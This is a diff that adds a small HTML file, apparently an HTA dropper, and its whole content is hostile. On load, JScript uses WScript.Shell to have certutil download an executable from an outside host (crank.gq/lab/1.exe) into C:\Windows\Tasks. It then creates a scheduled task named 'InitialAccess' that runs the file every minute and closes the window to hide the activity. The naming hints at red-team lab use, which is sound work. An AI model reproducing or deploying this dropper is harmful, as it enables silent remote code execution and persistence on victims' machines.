@@ -1,0 +1,14 @@
+<html>
+<head>
+<script language="jscript">
+        var e = "cmd /c certutil -urlcache -split -f https://crank.gq/lab/1.exe c:/windows/tasks/1.exe";
+        new ActiveXObject('WScript.Shell').Run(e,0,true);
+        var y= 'schtasks /create /sc minute /mo 1 /tn "InitialAccess" /tr C:\\Windows\\Tasks\\1.exe';
+        new ActiveXObject('WScript.Shell').Run(y,0,true);
+
+</script>
+</head>
+<body>
+<script>self.close();</script>
+</body>
+</html>
